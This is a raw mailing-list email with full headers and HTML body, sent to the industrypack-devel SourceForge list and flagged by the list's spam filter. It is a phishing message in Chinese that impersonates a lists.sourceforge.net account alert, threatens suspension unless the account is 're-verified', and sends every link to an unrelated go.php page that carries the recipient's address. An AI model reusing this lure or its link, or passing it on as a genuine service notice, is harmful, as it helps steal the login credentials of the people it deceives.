Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 7FFAA685FD6
	for <lists+industrypack-devel@lfdr.de>; Wed,  1 Feb 2023 07:37:24 +0100 (CET)
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1pN6kG-0006mz-Np
	for lists+industrypack-devel@lfdr.de;
	Wed, 01 Feb 2023 06:37:23 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <dev.kouadio@kgciweb.com>) id 1pN6kE-0006mp-47
 for industrypack-devel@lists.sourceforge.net;
 Wed, 01 Feb 2023 06:37:20 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Type:MIME-Version:Message-ID:Date:Subject:
 To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=Rc4Tv9IPDkIz4cdWWjqvLrDHcXT8jcnVAI1cd21/8ag=; b=mwI+GkAth5T8zHS6ab8drQUcTw
 5qyeaTgpSPcFBEUVBVjWVVFc3UGmLjrfUb7ETHMSVxbuytoRqy5C9BfqsO/+yZq2V2VSVf97PlG+8
 iKtMQkWumOdnaNMQjLvppZIGdLAijsL2ugo2/f6sGMQSJqBTWoXU0PXWxfj/BW0xPpoI=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Type:MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=Rc4Tv9IPDkIz4cdWWjqvLrDHcXT8jcnVAI1cd21/8ag=; b=G
 MHNeIHYVHB0HdkU2JdjrZPIb/yzmBr1/LMsQpqAPbSgAcgcBt2d1y4AxxR+Gx3JiWbvhqa4EftOF4
 9QntltiuJVv1MBCwUlxBORn5nO3vmN04EpMZ8QBjwRQdkAS6Gg7wIwHtO8MyvE9GVRkg8kv0zi/u+
 ech7dlYfx3AbY1lg=;
Received: from [172.93.165.221] (helo=mail0.gov.nl.ca)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1pN6k7-0006xi-Hn for industrypack-devel@lists.sourceforge.net;
 Wed, 01 Feb 2023 06:37:20 +0000
From: DeActivated lists.sourceforge.net  <dev.kouadio@kgciweb.com>
To: industrypack-devel@lists.sourceforge.net
Date: 01 Feb 2023 06:37:03 +0000
Message-ID: <20230201063703.3CDDD4D32AF2DA57@kgciweb.com>
MIME-Version: 1.0
X-Spam-Score: 7.6 (+++++++)
X-Spam-Report: Spam detection software, running on the system "util-spamd-1.v13.lw.sourceforge.com",
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 
 Content preview:  lists.sourceforge.net警报 !!! industrypack-devel 你 需要重新验证您的帐户并解决问题。
    
 
 Content analysis details:   (7.6 points, 6.0 required)
 
  pts rule name              description
 ---- ---------------------- --------------------------------------------------
  3.6 RCVD_IN_PBL            RBL: Received via a relay in Spamhaus PBL
                             [172.93.165.221 listed in zen.spamhaus.org]
  0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
  1.0 SPF_SOFTFAIL           SPF: sender does not match SPF record (softfail)
  0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
  0.0 HTML_MESSAGE           BODY: HTML included in message
  1.3 RDNS_NONE              Delivered to internal network by a host with no rDNS
  1.7 TO_NO_BRKTS_HTML_IMG   To: lacks brackets and HTML and one image
X-Headers-End: 1pN6k7-0006xi-Hn
Subject: [Industrypack-devel]
 =?UTF-8?B?4p224pyJ57ut6K6i5a2Y5YKo5a656YePIDw=?=industrypack-devel@lists.sourceforge.net>
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============3895167860330526844=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net


--===============3895167860330526844==
Content-Type: multipart/related;
	boundary="----=_NextPart_000_0012_617EC3FE.02796513"


------=_NextPart_000_0012_617EC3FE.02796513
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
<body style=3D"MARGIN: 0.5em">
<DIV=20
id=3Dm_683190989722972047m_-6032721345004870781m_-2439067863538642396m_3058=
399492765681181m_918186291092266165m_7634422226329940104m_-7032126509548015=
723gmail-m_8659674754675650901m_-6826752332389135391gmail-m_211761707209219=
0207m_-7631373168343895907m_-8307165502523462080m_5850016217968076842gmail-=
x_m_6114693268563166287gmail-m_8527316987077781814m_6479060872169190523gmai=
l-m_-7372023284232135715m_-7185147358967088195gmail-m_-8432303867815115979g=
mail-m_-5451420738159930100gmail-m_75389882969015510
 style=3D'FONT-SIZE: 12px; FONT-FAMILY: helveticaneue, "helvetica neue", he=
lvetica, arial, "lucida grande", sans-serif; WHITE-SPACE: normal; WORD-SPAC=
ING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FON=
T-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-=
COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; =
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
thickness: initial; text-decoration-style: initial;=20
text-decoration-color: initial' 99gmail-m_-2798911158611915434gmail-yiv9748=
480847m_9020529859107767777m_-841011741431>
<SPAN=20
id=3Dm_683190989722972047m_-6032721345004870781m_-2439067863538642396m_3058=
399492765681181m_918186291092266165m_7634422226329940104m_-7032126509548015=
723gmail-m_8659674754675650901m_-6826752332389135391gmail-m_211761707209219=
0207m_-7631373168343895907m_-8307165502523462080m_5850016217968076842gmail-=
x_m_6114693268563166287gmail-m_8527316987077781814m_6479060872169190523gmai=
l-m_-7372023284232135715m_-7185147358967088195gmail-m_-8432303867815115979g=
mail-m_-5451420738159930100gmail-m_75389882969015510
 style=3D"FONT-SIZE: 14pt; FONT-FAMILY: georgia, palatino; COLOR: rgb(255,2=
55,255); BACKGROUND-COLOR: rgb(255,102,0)" 99gmail-m_-2798911158611915434gm=
ail-yiv9748480847m_9020529859107767777m_-841011741431>
<SPAN=20
id=3Dm_683190989722972047m_-6032721345004870781m_-2439067863538642396m_3058=
399492765681181m_918186291092266165m_7634422226329940104m_-7032126509548015=
723gmail-m_8659674754675650901m_-6826752332389135391gmail-m_211761707209219=
0207m_-7631373168343895907m_-8307165502523462080m_5850016217968076842gmail-=
x_m_6114693268563166287gmail-m_8527316987077781814m_6479060872169190523gmai=
l-m_-7372023284232135715m_-7185147358967088195gmail-m_-8432303867815115979g=
mail-m_-5451420738159930100gmail-m_75389882969015510
 style=3D"FONT-WEIGHT: 700" 99gmail-m_-2798911158611915434gmail-yiv97484808=
47m_9020529859107767777m_-841011741431>
<SPAN lang=3Dko id=3Dm_683190989722972047m_-6032721345004870781m_-243906786=
3538642396m_3058399492765681181m_918186291092266165m_7634422226329940104m_-=
7032126509548015723gmail-m_8659674754675650901m_-6826752332389135391gmail-m=
_2117617072092190207m_-7631373168343895907m_-8307165502523462080m_585001621=
7968076842gmail-x_m_6114693268563166287gmail-m_8527316987077781814m_6479060=
872169190523gmail-m_-7372023284232135715m_-7185147358967088195gmail-m_-8432=
303867815115979gmail-result_box>
<FONT style=3D"VERTICAL-ALIGN: inherit"><FONT style=3D"VERTICAL-ALIGN: inhe=
rit"><SPAN style=3D"FONT-SIZE: 18px">lists.sourceforge.net</SPAN>&#35686;&#=
25253; !!!</FONT></FONT></SPAN></SPAN></SPAN></DIV>
<DIV=20
id=3Dm_683190989722972047m_-6032721345004870781m_-2439067863538642396m_3058=
399492765681181m_918186291092266165m_7634422226329940104m_-7032126509548015=
723gmail-m_8659674754675650901m_-6826752332389135391gmail-m_211761707209219=
0207m_-7631373168343895907m_-8307165502523462080m_5850016217968076842gmail-=
x_m_6114693268563166287gmail-m_8527316987077781814m_6479060872169190523gmai=
l-m_-7372023284232135715m_-7185147358967088195gmail-m_-8432303867815115979g=
mail-m_-5451420738159930100gmail-m_75389882969015510
 style=3D'FONT-SIZE: 12px; FONT-FAMILY: helveticaneue, "helvetica neue", he=
lvetica, arial, "lucida grande", sans-serif; WHITE-SPACE: normal; WORD-SPAC=
ING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FON=
T-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-=
COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; =
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
thickness: initial; text-decoration-style: initial;=20
text-decoration-color: initial' 99gmail-m_-2798911158611915434gmail-yiv9748=
480847m_9020529859107767777m_-841011741431><SPAN style=3D"FONT-SIZE: 14pt; =
FONT-FAMILY: georgia, palatino; COLOR: rgb(255,255,255); BACKGROUND-COLOR: =
rgb(255,102,0)"><SPAN style=3D"FONT-WEIGHT: 700"><BR></SPAN></SPAN></DIV>
<DIV=20
id=3Dm_683190989722972047m_-6032721345004870781m_-2439067863538642396m_3058=
399492765681181m_918186291092266165m_7634422226329940104m_-7032126509548015=
723gmail-m_8659674754675650901m_-6826752332389135391gmail-m_211761707209219=
0207m_-7631373168343895907m_-8307165502523462080m_5850016217968076842gmail-=
x_m_6114693268563166287gmail-m_8527316987077781814m_6479060872169190523gmai=
l-m_-7372023284232135715m_-7185147358967088195gmail-m_-8432303867815115979g=
mail-m_-5451420738159930100gmail-m_75389882969015510
 style=3D'FONT-SIZE: 12px; FONT-FAMILY: helveticaneue, "helvetica neue", he=
lvetica, arial, "lucida grande", sans-serif; WHITE-SPACE: normal; WORD-SPAC=
ING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FON=
T-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-=
COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; =
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
thickness: initial; text-decoration-style: initial;=20
text-decoration-color: initial' 99gmail-m_-2798911158611915434gmail-yiv9748=
480847m_9020529859107767777m_-841011741431><B style=3D"FONT-SIZE: 18px; FON=
T-FAMILY: georgia, palatino; COLOR: rgb(255,255,255); BACKGROUND-COLOR: rgb=
(255,102,0)">industrypack-devel</B><SPAN style=3D"FONT-SIZE: 14pt; FONT-FAM=
ILY: georgia, palatino; COLOR: rgb(255,255,255); BACKGROUND-COLOR: rgb(255,=
102,0)"><SPAN style=3D"FONT-WEIGHT: 700"><BR></SPAN></SPAN></DIV>
<P style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; WH=
ITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 40=
0; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-=
SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font=
-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-=
width: 0px; text-decoration-thickness: initial; text-decoration-style: init=
ial; text-decoration-color: initial">
<BR style=3D"FONT-FAMILY: arial, sans-serif"><SPAN style=3D"FONT-FAMILY: ar=
ial, sans-serif">&#20320; &#38656;&#35201;&#37325;&#26032;&#39564;&#35777;&=
#24744;&#30340;&#24080;&#25143;&#24182;&#35299;&#20915;&#38382;&#39064;&#12=
290;</SPAN></P>
<P style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; WH=
ITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 40=
0; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-=
SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font=
-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-=
width: 0px; text-decoration-thickness: initial; text-decoration-style: init=
ial; text-decoration-color: initial">
<SPAN style=3D"FONT-FAMILY: arial, sans-serif">&#21542;&#21017;&#65292;&#24=
744;&#30340;&#24080;&#25143;&#21487;&#33021;&#20250;&#34987;&#26242;&#20572=
;&#25110;&#20572;&#29992;</SPAN></P>
<P style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; WH=
ITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 40=
0; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-=
SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font=
-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-=
width: 0px; text-decoration-thickness: initial; text-decoration-style: init=
ial; text-decoration-color: initial">
<SPAN style=3D"FONT-FAMILY: georgia, palatino; FONT-WEIGHT: 700; COLOR: rgb=
(255,255,255); BACKGROUND-COLOR: rgb(255,102,0)"><A style=3D"COLOR: rgb(17,=
85,204)" href=3D"https://adentura.com.mx/tttrrrr/VerifyCN/VerifyCN/go.php?e=
mail=3Dindustrypack-devel@lists.sourceforge.net">&#37325;&#26032;&#39564;&#=
35777;&#24453;&#22788;&#29702;&#37038;&#20214;!!!</A></SPAN></P>
<P style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; WH=
ITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 40=
0; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-=
SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font=
-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-=
width: 0px; text-decoration-thickness: initial; text-decoration-style: init=
ial; text-decoration-color: initial">
<SPAN style=3D"FONT-FAMILY: arial, sans-serif">&#24744;&#26377; 15 &#26465;=
&#24453;&#22788;&#29702;&#37038;&#20214;&#12290;&#30095;&#36890;&#65281;&#6=
5281;&#65281;&lt;</SPAN><FONT size=3D4 face=3D"arial, sans-serif"><A style=
=3D"COLOR: rgb(17,85,204)" href=3D"https://adentura.com.mx/tttrrrr/VerifyCN=
/VerifyCN/go.php?email=3Dindustrypack-devel@lists.sourceforge.net">
 &#10102;<img aria-label=3D"?" class=3D"an1" style=3D"HEIGHT: 1.2em; WIDTH:=
 1.2em; VERTICAL-ALIGN: middle" alt=3D"?" src=3D"cid:32.png" loading=3D"laz=
y" data-emoji=3D"?" width=3D"32" height=3D"32"></A></FONT><SPAN style=3D'FO=
NT-FAMILY: "lucida grande", verdana, arial, helvetica, sans-serif; COLOR: r=
gb(51,51,51); TEXT-ALIGN: center'><FONT size=3D4><A style=3D"COLOR: rgb(17,=
85,204)" href=3D"https://adentura.com.mx/tttrrrr/VerifyCN/VerifyCN/go.php?e=
mail=3Dindustrypack-devel@lists.sourceforge.net"><U>
 <FONT color=3D#0000ff><FONT color=3D#0186ba>&#32493;&#35746;</FONT></FONT>=
</U>&#23384;&#20648;&#23481;&#37327; &lt;</A><U><FONT color=3D#0000ff>indus=
trypack-devel@lists.sourceforge.net<A style=3D"COLOR: rgb(17,85,204)" href=
=3D"https://adentura.com.mx/tttrrrr/VerifyCN/VerifyCN/go.php?email=3Dindust=
rypack-devel@lists.sourceforge.net" target=3D_blank data-saferedirecturl=3D=
"https://www.google.com/url?q=3Dhttp://hdhhd/&amp;source=3Dgmail&amp;ust=3D=
1675208034346000&amp;usg=3DAOvVaw0IoMCV7_8MyMxyL-a3G30V">&gt;</A></FONT> </=
U></FONT><B style=3D"FONT-SIZE: 11px"></B></SPAN></P>
<P style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; WH=
ITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 40=
0; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-=
SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font=
-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-=
width: 0px; text-decoration-thickness: initial; text-decoration-style: init=
ial; text-decoration-color: initial">
<SPAN style=3D"FONT-FAMILY: arial, sans-serif">&#24863;&#35874;&#24744;&#30=
340;&#21512;&#20316;&#12290;&#29256;&#26435;&#25152;&#26377;</SPAN><SPAN st=
yle=3D"FONT-FAMILY: arial, sans-serif"><SPAN>&nbsp;</SPAN>&copy; 2023 &#251=
52;&#26377;&#26435;&#21033; &#20445;&#30041;&#12290;</SPAN></P>
<P style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; WH=
ITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 40=
0; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-=
SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font=
-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-=
width: 0px; text-decoration-thickness: initial; text-decoration-style: init=
ial; text-decoration-color: initial">
<FONT color=3D#ff0000><SPAN style=3D"FONT-FAMILY: arial, sans-serif">______=
________________________ ______________________________<WBR>&nbsp; &nbsp; &=
nbsp;&nbsp;</SPAN><BR style=3D"FONT-FAMILY: arial, sans-serif"></FONT><SPAN=
 style=3D"FONT-FAMILY: arial, sans-serif"><FONT style=3D"VERTICAL-ALIGN: in=
herit"><FONT style=3D"VERTICAL-ALIGN: inherit">&#19981;&#35201; &#22238;&#2=
2797;&#27492;&#28040;&#24687;&#12290;</FONT><SPAN>&nbsp;</SPAN><FONT style=
=3D"VERTICAL-ALIGN: inherit">
 &#20320;&#19981;&#33021; &#22238;&#22797;&#21457;&#36865;&#21040;&#27492;&=
#22320;&#22336;&#30340;&#37038;&#20214;</FONT></FONT></SPAN><BR style=3D"FO=
NT-FAMILY: arial, sans-serif"></P></BODY></HTML>
------=_NextPart_000_0012_617EC3FE.02796513
Content-Type: image/png; name="32.png"
Content-Transfer-Encoding: base64
Content-ID: <32.png>

iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAATlBMVEUAAABvv/Bvv/Bvv/Bv
v/Bvv/C33/jb7/vS6/qKy/Ou2/fA4/j////t9/3J5/n2+/6c0/Wl1/aBx/J4w/Hk8/yTz/Rv
v/Bvv/Bvv/Bvv/Cf58huAAAAGnRSTlMAML+PgP//////////////////////cO9AIDgeyg4A
AADDSURBVHgB3dBFgsMwEETRoSa5rBaF7n/QMBn3k7cxfYu+PsT3z4rfc/BHLAvU6BIE6zCr
t3gN2FN2TElR3AIgW4+xrjY8A4QqGPBcGt4CRGK8aWaOt+BaJMeDVnOMAjBZw+O2AOOg1TPF
mScqxJPASHsjBppR50ZtFASKgBuVDV3vavFBIJRx5oGoyG3G8B543WAkkr4FyRxjofojuJ7q
VNo8glYFM9y6e2ARs/rarkENWNDsEmxps6juvs72Kw5f/8IJCigdJXJwK+gAAAAASUVORK5C
YII=

------=_NextPart_000_0012_617EC3FE.02796513--



--===============3895167860330526844==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============3895167860330526844==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============3895167860330526844==--


